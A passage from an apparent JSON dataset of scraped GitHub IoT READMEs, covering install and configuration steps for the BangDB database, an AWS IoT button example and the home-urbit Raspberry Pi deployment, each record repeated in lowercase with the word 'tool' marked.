on the product, we leave it there.\ncontact\nplease contact us if you would like our team to customise this reference for your product. that includes customisation of the firmware, backend and mobile app.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000842, "year": null}, {"Unnamed: 0": 855, "autor": 855, "date": null, "content": "BangDB\nGet BangDB 2.0 from;\nDownload from https://bangdb.com/download\nGet from github - clone this repo\nwget https://bangdb.com/downloads/bangdb_2.0_centos7.tar.gz\nTake the docker image from https://hub.docker.com/r/bangdb/bangdb\nHowever, it's recommended to register with BangDB (if you download from the website, you will have to register) to get regular updates\nIt's pretty straight forward to install the server. For detail info, please see the README present in the base folder or checkout https://bangdb.com/server-install/\nBangDB - nosql database\n_____________________\n| |BangDB Server (master) ver:2.0 64 bit\n| |IP = 0.0.0.0 : Port = 10101\n| BangDB Server 2.0 |PID = 2658\n| www.bangdb.com |\n|__________ |\n| | |\n| BSD | |\n| License | |\n|__________|__________|\nBasic Informantion\nHigh level features in BangDB includes (not limited to);\nNoSQL database\nKey value\nDocument\nLarge binary data [ BRS - BangDB Resource Server, deals with large files or objects, exposes S3 like features ]\nColumn [ native types ]\nTime series\nStream\nIngest any data [ different ways to ingest the data, agents can also be deployed ]\nTransform [ Transformation before ingestion is not required, can apply this in absolute and probabilistic manner or both ]\nfilter & join [ filter incoming stream on some running conditions and/or join with other to produce another etc. ]\naggregate [ slice n dice, groupby etc. ]\nstatistics [ count, unique count, sum, avg, stddev, ex-kurtosis, covar, running stats ]\nCEP [ Complex event processing, backed by table, scales linearly ]\nNotifications\nsliding window (continuous)\nUDF - [ use default or define your own functions at run time ]\nTrain and predcict on stream\nAI\nML\nIE (Information Extraction)\nDL (Deep Learning - with Enterprise Edition only)\nGraph\nCreate Graph within BangDB (it's just a table) and store nodes and/or triples (sub-rel-obj)\nUse Cypher to run query ( little modified version of Cypher for better efficiency, support and speed )\nCreate ontologies and query ( using absolute or probabilistic methods (IE - information extraction))\nThe db and other components are written in C/C++ and has following core features to achieve very high performance, efficiency and robustness for scale;\nBuffer pool and page cache\nAdaptive pre-fetch and flushing\nWrite ahead log\ntransaction (OCC)\nSEDA (Staged Event Driven)\nIO Layer\nprimary, secondary, composite, nested, reverse index\nNormal, wide, primitive, sliding window tables\nFully concurrent read and write\nBasic Types\nThe db provides simple types, interfaces and APIs, most important types are;\nbangdb_database\nbangdb_table\nbangdb_stream_manager\nbangdb_notification_manager\nbangdb_ml_helper\nbangdb_dl_helper\nBangDB Flavors\nBangDB comes in different flavors, namely\nEmbedded - BangDB becomes part of the user process. Similar to BerkeleyDB or LevelDB. It can also be run on microprocessors like RaspberryPi etc.\nServer (Client) - BangDB runs as a service and different clients can connect to it for processing. It's a master slave model. Training, BRS etc. could be part of the server or could be deployed as separate instances\nP2P based distributed database - [ Upcoming, later this year ] Implements consistent hashing, Chord+ algo, CAP Knob, high churning, linear scale etc. Note: API remains same across all flavors [ except in ~5% cases where certain changes are unavoidable ]. This allows portability, one can write app for embedded and deploy for Server or Cluster. In fact I usually write all my apps for embedded as it's easy to debug and test, and then deploy for other flavors\nOther Components\nClients - to help user write applications for BangDB, clients are fully concurrent and exposes simple APIs for writing such applications. Please note that the API for BangDB are same for all falvors. The core client is written in C++, it uses TCP socket to communicate. It also implements robust and very efficient message protocol for high performance. Java wrapper is provided for allowing users to write their apps in java/scala\nCli - a command line cli to interact with the DB. It uses quasi SQL langauge to interact with the db. It also allows users to deal with streams and draw simple charts in the terminal using Gnuplot for better visualization within terminal. User can also administer agents for streaming data into the BangDB. Further we can also switch the master to slave and vice versa and add slaves etc. and do cluster management work using the cli\nbrs-cli - a command line tool for uploading and downloading large files, much like S3 features\nInstall and Run\nRunning BangDB is very simple\ngo to the base folder of the bangdb (v2.0/bangdb-2.0_)\nDeal with Prereqs - The binary links with several libraries, few of these are provided along with the server in the lib folder. However, to ensure you have following libs on the server run the install.sh\nsudo apt-get update (or sudo yum update) sudo bash install.sh\n..................................................................................................................\nThis will install necessary libs and set the softlinks as well It also ensures that it has installed java8, python3 (python 3.6 for all, and 3.8 for ubuntu20)\nTo run IE (information extraction) we need few more lib; Hence it also installsSPARQLWrapper, wikipedia, html2text\nIt also sest the PATH and LD_LIBRARY_PATH libjvm - set the path or create soft link to libjvm which can be found by the server export LD_LIBRARY_PATH=$JAVA_HOME/jre/lib/amd64/server/ OR ln -sf $JAVA_HOME/jre/lib/amd64/server/libjvm.so /usr/local/lib/libjvm.so\nFor Cli, as it needs feedgnuplot which requires gnuplot and perl, hence it brings those as well\n..................................................................................................................\nThat's it. You are ready to run the server in following two ways;\nMethod 1\ncd bin ./bangdb-server-2.0\nThere are many command line args that this can take and ther are defined below in the configuration section\nMethod 2\n./bangdb-server start\nThis runs the db in background, you may check the status ./bangdb-server status\nand stop the server\n./bangdb-server stop\nThis method don't allow command line args to be specified, therefore we will need to set those in the bangdb.config file\nConfigurataion\nCheckout https://www.bangdb.com/bangdb-config for more details on configuring BangDB\nThere are however several ways to configure for the server, here are the relevant details;\nCommand line arguments\n----------------------\nThere are however several ways to configure for the server through command line arguments,\nhere are the relevant details;\npls type help to see the options\n./bangdb-server-2.0 -help\nHere are some of the details;\n----------------------------------------------------------------------------------------------------------------------------------------------------------\nUsage: -i [master | slave] -r [yes | no] -t [yes | no] -d [dbname] -s [IP:PORT] -m [IP:PORT] -p [IP] -b [yes | no] -c [tcp | http | hybrid] -w [PORT] -v\n----------------------------------------------------------------------------------------------------------------------------------------------------------\nOptions\n-------\n-i: defines the server's identity [master | slave], default is SERVER_TYPE (master) as defined in bangdb.config\n-r: defines replication state [yes | no], default is ENABLE_REPLICATION (0) as defined in bangdb.config\n-t: defines if transaction is enabled(yes) or disabled(no) [yes | no], default is no\n-d: defines the dbname, default is BANGDB_DATABASE_NAME (mydb) as defined in bangdb.config\n-s: defines IP:Port of this server, default is SERVER_ID:SERV_PORT as defined in bangdb.config\n-m: defines IP:Port of the master (required only for slave as it declares master with this option)\n-p: defines public IP of the server (required for master and slave to expose their own public IP)\n-b: defines if server to be run in background as daemon, default is foreground\n-c: defines if server runs as tcp server or http (rest) server or both (hybrid), default is tcp server\n-w: defines the http port when server runs in http or hybrid mode default is MASTER_SERVER_ID:MASTER_SERV_PORT as defined in the bangdb.config\n-v: prints the alpha-numeric version of the executable\nHence to run master with other values as defined in the bangdb.config, issue following command\n./bangdb-server -s 192.168.1.5:10101\nTo run slave for this master with default other values..\n./bangdb-server -i slave -s 192.168.1.6:10102 -m 192.168.1.5:10101\netc...\n----------------------------------------------------------------------------------------------------------------------------------------------------------\nBangDB requires bangdb.config file as an input, you may leave it in the same folder as bangdb-server.\nbangdb.config - using this you can set various run time config for the db. Also it provides enough hadles with tune the core and internals of db to run in the best possible manner depending upon the host configuration and boundaries. The config file has details before each of these paramaeters and also structured in a manner to allow you to pick and modify things in rather confortable way\nPlease refer www.bangdb.com/developer section to get most of the detail info as needed\nUpdate DB with new version\nTo update with new version, you won't need to do much except,\nstop the db\ncopy new bangdb-server binary (only one file)\nre run the db\nHope you find the db useful and it helps you solve some of the problems for you. Looking forward to connect with you, get your feedback, comments, suggestions etc. soon I am also going to start the community part here in few weeks\nPlease feel free to write to me at sachin@bangdb.com for any info, clarity, feedback etc.\nEnjoy!\nSachin", "link": "https://github.com/sachin-sinha/BangDB", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "bangdb\nget bangdb 2.0 from;\ndownload from https://bangdb.com/download\nget from github - clone this repo\nwget https://bangdb.com/downloads/bangdb_2.0_centos7.tar.gz\ntake the docker image from https://hub.docker.com/r/bangdb/bangdb\nhowever, it's recommended to register with bangdb (if you download from the website, you will have to register) to get regular updates\nit's pretty straight forward to install the server. for detail info, please see the readme present in the base folder or checkout https://bangdb.com/server-install/\nbangdb - nosql database\n_____________________\n| |bangdb server (master) ver:2.0 64 bit\n| |ip = 0.0.0.0 : port = 10101\n| bangdb server 2.0 |pid = 2658\n| www.bangdb.com |\n|__________ |\n| | |\n| bsd | |\n| license | |\n|__________|__________|\nbasic informantion\nhigh level features in bangdb includes (not limited to);\nnosql database\nkey value\ndocument\nlarge binary data [ brs - bangdb resource server, deals with large files or objects, exposes s3 like features ]\ncolumn [ native types ]\ntime series\nstream\ningest any data [ different ways to ingest the data, agents can also be deployed ]\ntransform [ transformation before ingestion is not required, can apply this in absolute and probabilistic manner or both ]\nfilter & join [ filter incoming stream on some running conditions and/or join with other to produce another etc. ]\naggregate [ slice n dice, groupby etc. ]\nstatistics [ count, unique count, sum, avg, stddev, ex-kurtosis, covar, running stats ]\ncep [ complex event processing, backed by table, scales linearly ]\nnotifications\nsliding window (continuous)\nudf - [ use default or define your own functions at run time ]\ntrain and predcict on stream\nai\nml\nie (information extraction)\ndl (deep learning - with enterprise edition only)\ngraph\ncreate graph within bangdb (it's just a table) and store nodes and/or triples (sub-rel-obj)\nuse cypher to run query ( little modified version of cypher for better efficiency, support and speed )\ncreate ontologies and query ( using absolute or probabilistic methods (ie - information extraction))\nthe db and other components are written in c/c++ and has following core features to achieve very high performance, efficiency and robustness for scale;\nbuffer pool and page cache\nadaptive pre-fetch and flushing\nwrite ahead log\ntransaction (occ)\nseda (staged event driven)\nio layer\nprimary, secondary, composite, nested, reverse index\nnormal, wide, primitive, sliding window tables\nfully concurrent read and write\nbasic types\nthe db provides simple types, interfaces and apis, most important types are;\nbangdb_database\nbangdb_table\nbangdb_stream_manager\nbangdb_notification_manager\nbangdb_ml_helper\nbangdb_dl_helper\nbangdb flavors\nbangdb comes in different flavors, namely\nembedded - bangdb becomes part of the user process. similar to berkeleydb or leveldb. it can also be run on microprocessors like raspberrypi etc.\nserver (client) - bangdb runs as a service and different clients can connect to it for processing. it's a master slave model. training, brs etc. could be part of the server or could be deployed as separate instances\np2p based distributed database - [ upcoming, later this year ] implements consistent hashing, chord+ algo, cap knob, high churning, linear scale etc. note: api remains same across all flavors [ except in ~5% cases where certain changes are unavoidable ]. this allows portability, one can write app for embedded and deploy for server or cluster. in fact i usually write all my apps for embedded as it's easy to debug and test, and then deploy for other flavors\nother components\nclients - to help user write applications for bangdb, clients are fully concurrent and exposes simple apis for writing such applications. please note that the api for bangdb are same for all falvors. the core client is written in c++, it uses tcp socket to communicate. it also implements robust and very efficient message protocol for high performance. java wrapper is provided for allowing users to write their apps in java/scala\ncli - a command line cli to interact with the db. it uses quasi sql langauge to interact with the db. it also allows users to deal with streams and draw simple charts in the terminal using gnuplot for better visualization within terminal. user can also administer agents for streaming data into the bangdb. further we can also switch the master to slave and vice versa and add slaves etc. and do cluster management work using the cli\nbrs-cli - a command line -----> tool !!!  for uploading and downloading large files, much like s3 features\ninstall and run\nrunning bangdb is very simple\ngo to the base folder of the bangdb (v2.0/bangdb-2.0_)\ndeal with prereqs - the binary links with several libraries, few of these are provided along with the server in the lib folder. however, to ensure you have following libs on the server run the install.sh\nsudo apt-get update (or sudo yum update) sudo bash install.sh\n..................................................................................................................\nthis will install necessary libs and set the softlinks as well it also ensures that it has installed java8, python3 (python 3.6 for all, and 3.8 for ubuntu20)\nto run ie (information extraction) we need few more lib; hence it also installssparqlwrapper, wikipedia, html2text\nit also sest the path and ld_library_path libjvm - set the path or create soft link to libjvm which can be found by the server export ld_library_path=$java_home/jre/lib/amd64/server/ or ln -sf $java_home/jre/lib/amd64/server/libjvm.so /usr/local/lib/libjvm.so\nfor cli, as it needs feedgnuplot which requires gnuplot and perl, hence it brings those as well\n..................................................................................................................\nthat's it. you are ready to run the server in following two ways;\nmethod 1\ncd bin ./bangdb-server-2.0\nthere are many command line args that this can take and ther are defined below in the configuration section\nmethod 2\n./bangdb-server start\nthis runs the db in background, you may check the status ./bangdb-server status\nand stop the server\n./bangdb-server stop\nthis method don't allow command line args to be specified, therefore we will need to set those in the bangdb.config file\nconfigurataion\ncheckout https://www.bangdb.com/bangdb-config for more details on configuring bangdb\nthere are however several ways to configure for the server, here are the relevant details;\ncommand line arguments\n----------------------\nthere are however several ways to configure for the server through command line arguments,\nhere are the relevant details;\npls type help to see the options\n./bangdb-server-2.0 -help\nhere are some of the details;\n----------------------------------------------------------------------------------------------------------------------------------------------------------\nusage: -i [master | slave] -r [yes | no] -t [yes | no] -d [dbname] -s [ip:port] -m [ip:port] -p [ip] -b [yes | no] -c [tcp | http | hybrid] -w [port] -v\n----------------------------------------------------------------------------------------------------------------------------------------------------------\noptions\n-------\n-i: defines the server's identity [master | slave], default is server_type (master) as defined in bangdb.config\n-r: defines replication state [yes | no], default is enable_replication (0) as defined in bangdb.config\n-t: defines if transaction is enabled(yes) or disabled(no) [yes | no], default is no\n-d: defines the dbname, default is bangdb_database_name (mydb) as defined in bangdb.config\n-s: defines ip:port of this server, default is server_id:serv_port as defined in bangdb.config\n-m: defines ip:port of the master (required only for slave as it declares master with this option)\n-p: defines public ip of the server (required for master and slave to expose their own public ip)\n-b: defines if server to be run in background as daemon, default is foreground\n-c: defines if server runs as tcp server or http (rest) server or both (hybrid), default is tcp server\n-w: defines the http port when server runs in http or hybrid mode default is master_server_id:master_serv_port as defined in the bangdb.config\n-v: prints the alpha-numeric version of the executable\nhence to run master with other values as defined in the bangdb.config, issue following command\n./bangdb-server -s 192.168.1.5:10101\nto run slave for this master with default other values..\n./bangdb-server -i slave -s 192.168.1.6:10102 -m 192.168.1.5:10101\netc...\n----------------------------------------------------------------------------------------------------------------------------------------------------------\nbangdb requires bangdb.config file as an input, you may leave it in the same folder as bangdb-server.\nbangdb.config - using this you can set various run time config for the db. also it provides enough hadles with tune the core and internals of db to run in the best possible manner depending upon the host configuration and boundaries. the config file has details before each of these paramaeters and also structured in a manner to allow you to pick and modify things in rather confortable way\nplease refer www.bangdb.com/developer section to get most of the detail info as needed\nupdate db with new version\nto update with new version, you won't need to do much except,\nstop the db\ncopy new bangdb-server binary (only one file)\nre run the db\nhope you find the db useful and it helps you solve some of the problems for you. looking forward to connect with you, get your feedback, comments, suggestions etc. soon i am also going to start the community part here in few weeks\nplease feel free to write to me at sachin@bangdb.com for any info, clarity, feedback etc.\nenjoy!\nsachin", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000855, "year": null}, {"Unnamed: 0": 864, "autor": 864, "date": null, "content": "AWS IoT button example\nThis is an Internet Button reference project: when a button on the device is pressed, a cloud backend gets a notification and performs an action. In this particular case, AWS Lambda function sends an email to the specific email address. But, again, the action could be anything.\nPrerequisites\nHardware: ESP8266 NodeMCU\nAmazon AWS account\nAmazon's aws management tool (see https://aws.amazon.com/cli)\nmos management tool installed (see mos installation guide)\nArchitecture\nThe data flow is as follows:\nUser presses the button\nDevice sends a message to the MQTT topic DEVICE_ID/button_pressed\nAWS IoT receives the message and calls AWS Lambda Function\nAWS Lambda Function publishes a message to the AWS SNS (Simple Notification Service)\nAWS SNS notifies subscribers: in this case, just sends a message to a single email address\nUser receives the email\nBuild instructions\nFollow the Cloud side setup instructions to setup AWS CLI utility and your AWS credentials\nFollow the Device setup instructions to setup your device and provision it to the AWS IoT\nDownload this repository as a zip file and extract this app on your computer\nExit any running mos.exe process\nOpen a command prompt (on Windows) or terminal (on Mac/Linux) and go to the extracted app.\nYou should be able to see the mos.yml file by running dir mos.yml command (on Windows) or ls -l mos.yml (on Mac/Linux)\nFind out your device ID\nmos config-get device.id\nOn Windows, here and further, you might need to specify the full path to the mos.exe binary:\nc:\\path\\to\\mos.exe config-get device.id\nRun the following command to create AWS Cloud Formation stack. Change $DEVICE_ID to your actual device ID, and $MY_EMAIL to your email:\naws cloudformation create-stack --stack-name my-internet-button --parameters ParameterKey=TopicName,ParameterValue=$DEVICE_ID/button_pressed ParameterKey=SubscriptionEmail,ParameterValue=$MY_EMAIL --capabilities CAPABILITY_IAM --template-body file://aws_button_template.json\nWait until the stack creation is completed (it may take a few minutes). Alternatively, you can use the web UI to check the status and read event details: https://console.aws.amazon.com/cloudformation/home\nDuring the stack creation, AWS will send a Subscription Confirmation email, so check your email and confirm the subscription by following a link.\nRun the following command to ensure that the stack creation is complete:\naws cloudformation wait stack-create-complete --stack-name my-internet-button\nCopy the fs/init.js file to your device:\nmos put fs/init.js\nAttach to the device to see the device logs\nmos console\nReboot your device by pressing a reboot button\nWhen the device is connected to the AWS IoT, push the \"flash\" button on your device. In the device's console, you'll see a message like this:\nPublished: yes topic: esp8266_DA84C1/button_pressed message: {\"free_ram\":26824,\"total_ram\":44520}\nNow, check your email. It'll contain a new message:\nButton pressed: esp8266_DA84C1/button_pressed\nNow you can go to your AWS dashboard and play with your stack. For example, you may add more subscriptions to the SNS: other than sending emails, it can also call some URL, send SMS, etc. And, of course, you can modify your lambda function to do whatever you want in response to the button press.", "link": "https://github.com/mongoose-os-apps/aws-iot-button", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "aws iot button example\nthis is an internet button reference project: when a button on the device is pressed, a cloud backend gets a notification and performs an action. in this particular case, aws lambda function sends an email to the specific email address. but, again, the action could be anything.\nprerequisites\nhardware: esp8266 nodemcu\namazon aws account\namazon's aws management -----> tool !!!  (see https://aws.amazon.com/cli)\nmos management -----> tool !!!  installed (see mos installation guide)\narchitecture\nthe data flow is as follows:\nuser presses the button\ndevice sends a message to the mqtt topic device_id/button_pressed\naws iot receives the message and calls aws lambda function\naws lambda function publishes a message to the aws sns (simple notification service)\naws sns notifies subscribers: in this case, just sends a message to a single email address\nuser receives the email\nbuild instructions\nfollow the cloud side setup instructions to setup aws cli utility and your aws credentials\nfollow the device setup instructions to setup your device and provision it to the aws iot\ndownload this repository as a zip file and extract this app on your computer\nexit any running mos.exe process\nopen a command prompt (on windows) or terminal (on mac/linux) and go to the extracted app.\nyou should be able to see the mos.yml file by running dir mos.yml command (on windows) or ls -l mos.yml (on mac/linux)\nfind out your device id\nmos config-get device.id\non windows, here and further, you might need to specify the full path to the mos.exe binary:\nc:\\path\\to\\mos.exe config-get device.id\nrun the following command to create aws cloud formation stack. change $device_id to your actual device id, and $my_email to your email:\naws cloudformation create-stack --stack-name my-internet-button --parameters parameterkey=topicname,parametervalue=$device_id/button_pressed parameterkey=subscriptionemail,parametervalue=$my_email --capabilities capability_iam --template-body file://aws_button_template.json\nwait until the stack creation is completed (it may take a few minutes). alternatively, you can use the web ui to check the status and read event details: https://console.aws.amazon.com/cloudformation/home\nduring the stack creation, aws will send a subscription confirmation email, so check your email and confirm the subscription by following a link.\nrun the following command to ensure that the stack creation is complete:\naws cloudformation wait stack-create-complete --stack-name my-internet-button\ncopy the fs/init.js file to your device:\nmos put fs/init.js\nattach to the device to see the device logs\nmos console\nreboot your device by pressing a reboot button\nwhen the device is connected to the aws iot, push the \"flash\" button on your device. in the device's console, you'll see a message like this:\npublished: yes topic: esp8266_da84c1/button_pressed message: {\"free_ram\":26824,\"total_ram\":44520}\nnow, check your email. it'll contain a new message:\nbutton pressed: esp8266_da84c1/button_pressed\nnow you can go to your aws dashboard and play with your stack. for example, you may add more subscriptions to the sns: other than sending emails, it can also call some url, send sms, etc. and, of course, you can modify your lambda function to do whatever you want in response to the button press.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000864, "year": null}, {"Unnamed: 0": 866, "autor": 866, "date": null, "content": "Introduction\nUrbit is a new OS and peer-to-peer network that\u2019s simple by design, built to last forever, and 100% owned by its users. Urbit OS makes the server side usable for individuals without the need for MEGACORP to run their software. Urbit is your own personal server. Urbit is your last computer. Welcome.\nEngage\nA project by ~sipsen-pilser.\nIf you want to chat about this:\nopen a GitHub issue\nJoin ~middev/the-forge and susbscribe to the project's channel\nJoin our telegram group\nProject Status & Urbit Grant\nThe project is under heavy development, as we move away from an MVP and towards an aplpha version of the software. You can follow the progress of the project via the projects tab in this GitHub repository.\nKnown issues\n\"Public Device URL\" offered by balena has a couple of issues. Although we don't have to setup our own DNS, it adds considerable lag to the experience. This is because it adds an extra proxy to the request, as we go through balena's servers. Moreover, either due to incorrect proxying or increased lag, MINIO can't be added to Urbit. As we move forward, the setup will automatically use a proper DNS solution.\nurbit is very demanding when it comes to disk speed. It is advised to use this on a board with an SSD through a SATA or PCI connection. Aka, a Raspberry pi with an external USB-3 SSD will propably generate lag.\nIf you use Raspberry Pi, it doesn't play out of the box with SSD. In order to boot from SSD, please follow the instructions here.\nDeploy with balena\nbalena is a complete set of tools for building, deploying and managing fleets of connected linux devices. We opted to use balena because it manages the whole lifecycle of our device and application. We only have to download the OS from our account and load it into the SD card for the Raspberry pi.\nbalena is completely free for up to 10 devices and most of it's components are Open Source.\nThe same setup will work flawlessly if you install another OS into the raspberry pi and use docker-compose up.\nGetting Started with a new comet\nClick on the Button above\nCreate a balena account (or log in). Create application with default settings.\nTo add a device to the application, download the OS image and flash it to an SD card.\nInsert the SD card to the Rasspberry pi 4, connect it to power + Internet. Wait to download your application.\nVisit the Cloud Dashboard to see that everything works as expected\nClick on the web terminal, select urbit and open a terminal session. Execute /usr/sbin/get-urbit-code.sh. This script will give you the code for your Urbit.\nVisit the following address to access ~Urbit: ship.<device_public_url>. Read more about balena Public Device URLs.\nGetting Started with a planet/star/galaxy keyfile\nAdd the device service environment variable KEY_TRANSFER with a value of 1 to the service urbit. This will cause the urbit container to restart without starting the urbit binary. It will idle.\nOpen the web-terminal in urbit container\nCd into keys directory: cd /urbit/keys\nOpen a text editor for a file named after your planet: nano sipsen-pilser.key\nCopy or type your key into the text edit\nClose the text editor\nGo back to the service variables and remove the KEY_TRANSFER variable (or change it's value to 0).\nThe container will restart, read the key and boot that planet/star/galaxy.\nMoreover, if urbit has already booted a commet (default behaviour), then you have to add another environment variable called: PIER_NAME, equal to the name of your planet (e.g sipsen-pilser). This will tell Urbit what pier to boot from, since now there are 2 piers (the new planet and the original commet).\nGetting Started without balena\nDownload an OS system (e.g Raspberry Pi OS). Make sure it's 64-bit.\nFlash the image into an SD card.\nGet terminal access to the machine (e.g using ssh) and install docker.\nDownload this repository, run git clone https://github.com/odyslam/home-urbit\ncd into the repository\nrun sudo docker-compose up\nAfter you seee output from the Urbit container that references localhost, open a second terminal window.\nIn the second window, run sudo docker ps to find the ID of the container that runs urbit.\nRun sudo docker exec -it /bin/bash/ <container_ID. You will get a new terminal inside the container.\nRun /usr/sbin/get-urbit-code.sh. You should see a code on the terminal. That's the password for your ship. Note it down.\nType exit to exit the shell.\nvisit <raspberrypi_IP> from a browser and enter the code you noted.\nCelebrate \ud83c\udf7e\nEnvironment variables by container\nUrbit\n$AMES_PORT: The port for the ames protocol. Default value: 34343\n$PIER_NAME: Name of the pier the user wants to boot from. Useful if there are more than 1 pier available.\n$TRANSFER_KEY: If set to 1, the urbit container will start but it will not start urbit. The container will idle and the user can ssh into the container to place their key in keys directory. The key should have the form <name>.key.\nNetdata\n$NETDATA_CLAIM_TOKEN: Claim token for Netdata Cloud\n$NETDATA_CLAIM_ROOMS: War-room to add the Netdata Agent\n$NETDATA_CLAIM_URL: \"https://app.netdata.cloud\"\n$DO_NOT_TRACK: Set to 1 to disable anonymous product usage statistics for the Netdata agent.\nTo read more about claiming the Netdata Agent on Netdata Cloud, visit Netdata Learn.\nCaddy\n$DOMAIN: The default domain name for the device. Default is <balena_device_uuid>.balena-devices.com.\n$PROTOCOL: What protocol is used to access Home-Urbit. Default is http.\nMinio-s3\n$MINIO_ROOT_USER: The user for minio authnetication. Default: home-urbit\n$MINIO_ROOT_PASSWORD: The password for minio authnetication. Default: home-urbit\nRelevant documentation\nHow to add environment variables with Docker/Docker-compose: Docker documentation\nHow to add environment variables with balena: balena docs\nAccessing the services\nCaddy acts as a reverse-proxy. It proxies request based on the subdomain of the request.\ns3.<domain> will proxy to the MINIO's dashboard\ns3-api.<domain> will proxy to the MINIO API\nship.<domain> will proxy to Urbit's dashboard\nmonitor.<domain> will proxy to Netdata's dashboard\nHelper scripts\nThese helper scripts are available inside the urbit container. To run them, ssh into the container either using the balena CLI tool or via the web terminal.\n/usr/sbin/get-urbit-code.sh: Get your Ship's code. This is required so that you can log into your ship for the first time.\n/usr/sbin/reset-urbit-code.sh: Reset your Ship's code.\nAdvanced users:/usr/sbin/run-urbit-cmd.sh -a <app> -c <ommand> -s <stdout>: Run any command on your Urbit.\nTips\nYou can ssh into your device via balena webterminal, balena ssh, and regular ssh. Read more on the docs.\nYou can tunnel any connection from your local computer to any port on the device, using balena tunnel.\nWith docker, we can't automatically set the hostname of the device. Thus, you will need to access it via the IP and not homeurbit.local. If you want to change the hostname of your Raspberry Pi.\nLicense\nMIT License\nContributing\nYes, please.", "link": "https://github.com/odyslam/home-urbit", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "introduction\nurbit is a new os and peer-to-peer network that\u2019s simple by design, built to last forever, and 100% owned by its users. urbit os makes the server side usable for individuals without the need for megacorp to run their software. urbit is your own personal server. urbit is your last computer. welcome.\nengage\na project by ~sipsen-pilser.\nif you want to chat about this:\nopen a github issue\njoin ~middev/the-forge and susbscribe to the project's channel\njoin our telegram group\nproject status & urbit grant\nthe project is under heavy development, as we move away from an mvp and towards an aplpha version of the software. you can follow the progress of the project via the projects tab in this github repository.\nknown issues\n\"public device url\" offered by balena has a couple of issues. although we don't have to setup our own dns, it adds considerable lag to the experience. this is because it adds an extra proxy to the request, as we go through balena's servers. moreover, either due to incorrect proxying or increased lag, minio can't be added to urbit. as we move forward, the setup will automatically use a proper dns solution.\nurbit is very demanding when it comes to disk speed. it is advised to use this on a board with an ssd through a sata or pci connection. aka, a raspberry pi with an external usb-3 ssd will propably generate lag.\nif you use raspberry pi, it doesn't play out of the box with ssd. in order to boot from ssd, please follow the instructions here.\ndeploy with balena\nbalena is a complete set of tools for building, deploying and managing fleets of connected linux devices. we opted to use balena because it manages the whole lifecycle of our device and application. we only have to download the os from our account and load it into the sd card for the raspberry pi.\nbalena is completely free for up to 10 devices and most of it's components are open source.\nthe same setup will work flawlessly if you install another os into the raspberry pi and use docker-compose up.\ngetting started with a new comet\nclick on the button above\ncreate a balena account (or log in). create application with default settings.\nto add a device to the application, download the os image and flash it to an sd card.\ninsert the sd card to the rasspberry pi 4, connect it to power + internet. wait to download your application.\nvisit the cloud dashboard to see that everything works as expected\nclick on the web terminal, select urbit and open a terminal session. execute /usr/sbin/get-urbit-code.sh. this script will give you the code for your urbit.\nvisit the following address to access ~urbit: ship.<device_public_url>. read more about balena public device urls.\ngetting started with a planet/star/galaxy keyfile\nadd the device service environment variable key_transfer with a value of 1 to the service urbit. this will cause the urbit container to restart without starting the urbit binary. it will idle.\nopen the web-terminal in urbit container\ncd into keys directory: cd /urbit/keys\nopen a text editor for a file named after your planet: nano sipsen-pilser.key\ncopy or type your key into the text edit\nclose the text editor\ngo back to the service variables and remove the key_transfer variable (or change it's value to 0).\nthe container will restart, read the key and boot that planet/star/galaxy.\nmoreover, if urbit has already booted a commet (default behaviour), then you have to add another environment variable called: pier_name, equal to the name of your planet (e.g sipsen-pilser). this will tell urbit what pier to boot from, since now there are 2 piers (the new planet and the original commet).\ngetting started without balena\ndownload an os system (e.g raspberry pi os). make sure it's 64-bit.\nflash the image into an sd card.\nget terminal access to the machine (e.g using ssh) and install docker.\ndownload this repository, run git clone https://github.com/odyslam/home-urbit\ncd into the repository\nrun sudo docker-compose up\nafter you seee output from the urbit container that references localhost, open a second terminal window.\nin the second window, run sudo docker ps to find the id of the container that runs urbit.\nrun sudo docker exec -it /bin/bash/ <container_id. you will get a new terminal inside the container.\nrun /usr/sbin/get-urbit-code.sh. you should see a code on the terminal. that's the password for your ship. note it down.\ntype exit to exit the shell.\nvisit <raspberrypi_ip> from a browser and enter the code you noted.\ncelebrate \ud83c\udf7e\nenvironment variables by container\nurbit\n$ames_port: the port for the ames protocol. default value: 34343\n$pier_name: name of the pier the user wants to boot from. useful if there are more than 1 pier available.\n$transfer_key: if set to 1, the urbit container will start but it will not start urbit. the container will idle and the user can ssh into the container to place their key in keys directory. the key should have the form <name>.key.\nnetdata\n$netdata_claim_token: claim token for netdata cloud\n$netdata_claim_rooms: war-room to add the netdata agent\n$netdata_claim_url: \"https://app.netdata.cloud\"\n$do_not_track: set to 1 to disable anonymous product usage statistics for the netdata agent.\nto read more about claiming the netdata agent on netdata cloud, visit netdata learn.\ncaddy\n$domain: the default domain name for the device. default is <balena_device_uuid>.balena-devices.com.\n$protocol: what protocol is used to access home-urbit. default is http.\nminio-s3\n$minio_root_user: the user for minio authnetication. default: home-urbit\n$minio_root_password: the password for minio authnetication. default: home-urbit\nrelevant documentation\nhow to add environment variables with docker/docker-compose: docker documentation\nhow to add environment variables with balena: balena docs\naccessing the services\ncaddy acts as a reverse-proxy. it proxies request based on the subdomain of the request.\ns3.<domain> will proxy to the minio's dashboard\ns3-api.<domain> will proxy to the minio api\nship.<domain> will proxy to urbit's dashboard\nmonitor.<domain> will proxy to netdata's dashboard\nhelper scripts\nthese helper scripts are available inside the urbit container. to run them, ssh into the container either using the balena cli -----> tool !!!  or via the web terminal.\n/usr/sbin/get-urbit-code.sh: get your ship's code. this is required so that you can log into your ship for the first time.\n/usr/sbin/reset-urbit-code.sh: reset your ship's code.\nadvanced users:/usr/sbin/run-urbit-cmd.sh -a <app> -c <ommand> -s <stdout>: run any command on your urbit.\ntips\nyou can ssh into your device via balena webterminal, balena ssh, and regular ssh. read more on the docs.\nyou can tunnel any connection from your local computer to any port on the device, using balena tunnel.\nwith docker, we can't automatically set the hostname of the device. thus, you will need to access it via the ip and not homeurbit.local. if you want to change the hostname of your raspberry pi.\nlicense\nmit license\ncontributing\nyes, please.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", 